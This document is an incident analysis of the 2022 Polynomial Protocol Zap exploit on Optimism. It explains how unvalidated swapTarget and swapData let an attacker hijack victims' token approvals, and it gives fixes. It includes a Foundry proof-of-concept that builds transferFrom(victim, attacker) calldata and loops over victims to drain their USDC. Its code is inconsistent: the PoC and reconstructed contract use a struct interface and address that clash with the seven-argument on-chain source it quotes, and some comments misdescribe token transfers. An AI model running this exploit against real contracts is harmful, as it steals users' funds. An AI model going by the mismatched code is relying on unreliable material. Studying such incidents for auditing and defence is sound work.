# Polynomial — swapAndDeposit() Arbitrary Call Victim Allowance Hijack Attack Analysis

| Field | Details |
|------|------|
| **Date** | 2022-11 |
| **Protocol** | Polynomial Protocol |
| **Chain** | Optimism |
| **Loss** | ~$1,400 |
| **Vulnerable Contract** | [0x00dD464dBA9fC0C20c4cC4D470E8Bf965788C150](https://optimistic.etherscan.io/address/0x00dD464dBA9fC0C20c4cC4D470E8Bf965788C150) |
| **Primary Zap** | [0xDEEB242E045e5827Edf526399bd13E7fFEba4281](https://optimistic.etherscan.io/address/0xDEEB242E045e5827Edf526399bd13E7fFEba4281) |
| **Secondary Zap** | [0xB162f01C5BDA7a68292410aaA059E7Ce28D77c82](https://optimistic.etherscan.io/address/0xB162f01C5BDA7a68292410aaA059E7Ce28D77c82) |
| **Pool** | [0x1D751bc1A723AccF1942122ca9aa82d49D08d2AE](https://optimistic.etherscan.io/address/0x1D751bc1A723AccF1942122ca9aa82d49D08d2AE) |
| **Root Cause** | `swapAndDeposit()` executes the `user` parameter and `swapData` calldata without validation, enabling victim allowance hijacking |
| **CWE** | CWE-284: Improper Access Control |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2022-11/Polynomial_exp.sol) |

---
## 1. Vulnerability Overview

Polynomial Protocol's Zap contract provided a `swapAndDeposit()` function that allowed users to swap tokens and simultaneously deposit them into a pool. The function accepted a `user` parameter (the address from which tokens would be pulled) and `swapData` (swap calldata) as external inputs, but neither parameter was validated. The attacker called `swapAndDeposit()` with `user` set to the victim's address and `swapData` set to `transferFrom(victim, attacker, amount)` calldata. The Zap contract then transferred the victim's tokens on its own behalf. The same pattern seen in BrahTOPG, RabbyWallet, and TransitSwap occurred on Optimism as well.

---
## 2. Vulnerable Code Analysis

```solidity
// ❌ Vulnerable swapAndDeposit() - user + swapData parameters unvalidated
contract PolynomialZap {
    address public pool;

    struct SwapParams {
        address swapTarget;  // ❌ Arbitrary contract address
        bytes swapData;      // ❌ Arbitrary calldata
        address inputToken;
        uint256 inputAmount;
        address user;        // ❌ Arbitrary victim address
    }

    function swapAndDeposit(SwapParams calldata params) external {
        // ❌ Does not verify that user == msg.sender
        // Allows pulling arbitrary victim's tokens in the Zap's name
        IERC20(params.inputToken).transferFrom(
            params.user,        // ← Victim address can be specified
            address(this),
            params.inputAmount
        );

        // ❌ Executes swapTarget + swapData without validation
        // Executes arbitrary calldata against an arbitrary contract
        (bool success,) = params.swapTarget.call(params.swapData);
        require(success, "Swap failed");

        // Deposits swap output into the pool
        uint256 outputAmount = IERC20(pool).balanceOf(address(this));
        IPool(pool).deposit(outputAmount);
    }
}

// ✅ Correct pattern - enforce msg.sender + whitelist
contract SafePolynomialZap {
    mapping(address => bool) public allowedSwapTargets;

    function swapAndDeposit(SwapParams calldata params) external {
        // ✅ Tokens must always be pulled from the caller themselves
        IERC20(params.inputToken).transferFrom(
            msg.sender,  // ← Enforce msg.sender
            address(this),
            params.inputAmount
        );

        // ✅ Only call allowed swap targets
        require(allowedSwapTargets[params.swapTarget], "Target not allowed");
        // ✅ Block dangerous selectors
        bytes4 sel = bytes4(params.swapData);
        require(sel != IERC20.transferFrom.selector, "Forbidden");
        require(sel != IERC20.transfer.selector, "Forbidden");

        (bool success,) = params.swapTarget.call(params.swapData);
        require(success, "Swap failed");

        uint256 outputAmount = IERC20(pool).balanceOf(address(this));
        IPool(pool).deposit(outputAmount);
    }
}
```


### On-Chain Original Code

Source: **Sourcify partial-match** — PolynomialZap.sol (0xDEEB242E045e5827Edf526399bd13E7fFEba4281, Optimism)
https://sourcify.dev/server/files/any/10/0xDEEB242E045e5827Edf526399bd13E7fFEba4281

```solidity
function swapAndDeposit(
    address user,          // ❌ Arbitrary address — caller can specify any victim
    address token,
    address depositToken,
    address swapTarget,    // ❌ Arbitrary contract — no whitelist
    address vault,
    uint256 amount,
    bytes memory swapData  // ❌ Arbitrary calldata — no selector check
) external payable nonReentrant {
    uint256 msgValue;

    if (token == ETH) {
        msgValue = address(this).balance;
        require(msgValue == amount, "INVALID_BALANCE");
    } else {
        ERC20(token).safeTransfer(msg.sender, amount); // ❌ pulls from msg.sender, not `user`
        ERC20(token).safeApprove(swapTarget, amount);  // ❌ approves the arbitrary swapTarget
    }

    (bool success, ) = swapTarget.call{value: msgValue}(swapData); // ❌ arbitrary external call
    require(success, "SWAP_FAILED");

    uint256 depositAmount = ERC20(depositToken).balanceOf(address(this));
    ERC20(depositToken).approve(vault, depositAmount);
    IPolynomialVault(vault).initiateDeposit(user, depositAmount); // user param passed to vault
}
```

**Why it is exploitable (identify the bug from the code):**

- `swapTarget` and `swapData` are fully attacker-controlled with no whitelist or selector validation. The attacker sets `swapTarget = USDC` and `swapData = abi.encodeWithSelector(transferFrom.selector, victim, attacker, amount)`.
- The `safeApprove(swapTarget, amount)` line first approves the USDC contract (the `swapTarget`) to spend the Zap's USDC allowance, but the critical issue is the call `swapTarget.call(swapData)` — which executes `USDC.transferFrom(victim, attacker, amount)` using the victim's prior approval to the Zap contract.
- The Zap contract has been approved by victims for normal use. Since the Zap calls `transferFrom` on behalf of a victim, USDC sees the Zap (an approved spender) executing `transferFrom(victim, attacker, ...)` — and it succeeds.
- The `user` parameter in the final `initiateDeposit(user, depositAmount)` is irrelevant; the exploit works via the arbitrary call step before deposit.

```solidity
// ✅ Fix: whitelist swap targets and block dangerous selectors
mapping(address => bool) public allowedSwapTargets;

function swapAndDeposit(..., address swapTarget, ..., bytes memory swapData) external payable nonReentrant {
    require(allowedSwapTargets[swapTarget], "Target not allowed");
    bytes4 selector = bytes4(swapData);
    require(selector != IERC20.transferFrom.selector, "Forbidden selector");
    require(selector != IERC20.transfer.selector, "Forbidden selector");
    // Use msg.sender for all token pulls, never the `user` param
    ERC20(token).safeTransferFrom(msg.sender, address(this), amount);
    ...
}
```

## 3. Attack Flow (ASCII Diagram)

```
Attacker
    │
    ├─[1] Victim Reconnaissance
    │       Collect addresses that have approved tokens to the Polynomial Zap
    │
    ├─[2] Construct SwapParams:
    │       user        = victim    ← Victim address
    │       inputToken  = USDC      ← Token held by victim
    │       inputAmount = victimBalance
    │       swapTarget  = USDC contract
    │       swapData    = transferFrom(victim, attacker, amount)
    │
    ├─[3] Call PolynomialZap.swapAndDeposit(params)
    │       ❌ No user validation
    │       → IERC20(USDC).transferFrom(victim, Zap, amount)
    │       ❌ No swapData validation
    │       → Zap executes USDC.transferFrom(victim, attacker, amount)
    │
    ├─[4] Repeat for multiple victims
    │
    └─[5] Net profit: ~$1,400 USDC (small scale)
```

---
## 4. PoC Code (Core Logic + Comments)

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";

interface IPolynomialZap {
    struct SwapParams {
        address swapTarget;
        bytes swapData;
        address inputToken;
        uint256 inputAmount;
        address user;
    }
    function swapAndDeposit(SwapParams calldata params) external;
}

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function allowance(address, address) external view returns (uint256);
}

contract PolynomialExploit is Test {
    IPolynomialZap zap = IPolynomialZap(0x00dD464dBA9fC0C20c4cC4D470E8Bf965788C150);
    IERC20 USDC        = IERC20(0x7F5c764cBc14f9669B88837ca1490cCa17c31607); // Optimism USDC

    address[] victims;

    function setUp() public {
        vm.createSelectFork("optimism");
    }

    function testExploit() public {
        emit log_named_decimal_uint("[Start] Attacker USDC", USDC.balanceOf(address(this)), 6);

        for (uint256 i = 0; i < victims.length; i++) {
            address victim  = victims[i];
            uint256 allowance = USDC.allowance(victim, address(zap));
            uint256 balance   = USDC.balanceOf(victim);
            uint256 amount    = allowance < balance ? allowance : balance;
            if (amount == 0) continue;

            // ⚡ swapTarget = USDC, swapData = transferFrom(victim, attacker)
            bytes memory maliciousData = abi.encodeWithSelector(
                bytes4(keccak256("transferFrom(address,address,uint256)")),
                victim,
                address(this),
                amount
            );

            // user = victim, no validation
            zap.swapAndDeposit(IPolynomialZap.SwapParams({
                swapTarget:  address(USDC),
                swapData:    maliciousData,
                inputToken:  address(USDC),
                inputAmount: 0,            // transferFrom is handled in swapData
                user:        victim
            }));
        }

        emit log_named_decimal_uint("[End] Attacker USDC", USDC.balanceOf(address(this)), 6);
    }
}
```

---
## 5. Vulnerability Classification (Table)

| Category | Details |
|------|-----------|
| **Vulnerability Type** | swapAndDeposit() user + swapData parameters unvalidated |
| **CWE** | CWE-284: Improper Access Control |
| **OWASP DeFi** | Arbitrary Call Vulnerability (victim allowance hijacking) |
| **Attack Vector** | `swapAndDeposit({user: victim, swapTarget: USDC, swapData: transferFrom(victim, attacker)})` |
| **Preconditions** | No `user == msg.sender` check, swapTarget/swapData unvalidated |
| **Impact** | ~$1,400 victim token loss |

---
## 6. Remediation Recommendations

1. **Remove the `user` parameter**: Remove the `user` parameter and use `msg.sender` directly so that only the caller's own tokens are processed.
2. **swapTarget whitelist**: Restrict callable swap targets to a pre-approved list of DEXes.
3. **Block dangerous selectors**: Revert if the first 4 bytes of calldata match the `transfer`, `transferFrom`, or `approve` selectors.

---
## 7. Lessons Learned

- **Cross-chain identical pattern**: The same arbitrary external call vulnerability appeared across different chains — RabbyWallet (ETH), BrahTOPG (ETH), TransitSwap (BSC), and Polynomial (Optimism). Vulnerability patterns apply identically regardless of which chain they occur on.
- **Warning value of small-scale losses**: A loss of ~$1,400 may appear minor, but had the same vulnerability existed in a contract with a larger TVL, the damage would have been significantly greater. Loss magnitude and vulnerability severity must be assessed independently.
- **Auditing Zap contract patterns**: Every contract using `zapIn()`, `swapAndDeposit()`, or `execute()` patterns must enforce all three of the following: (1) the `from` address equals `msg.sender`, (2) a swap target whitelist, and (3) blocking of dangerous selectors.